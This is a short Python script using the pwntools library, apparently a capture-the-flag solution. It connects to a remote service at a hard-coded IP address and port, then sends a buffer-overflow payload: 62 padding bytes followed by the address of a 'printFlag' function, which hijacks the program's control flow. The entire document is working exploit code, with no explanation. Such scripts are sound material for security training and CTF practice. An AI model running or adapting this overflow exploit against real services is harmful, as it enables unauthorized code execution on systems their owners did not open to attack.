from pwn import *

host = "213.133.103.186"
port = 5548

elf = ELF("a.out")
addr_pFlag = 0x56555000 + elf.symbols["printFlag"]

r = remote(host, port)
r.recvuntil(b"Enter your name: ")
payload = b"A" * 62
payload += p32(addr_pFlag)
r.sendline(payload)
print(r.recvall())
r.close()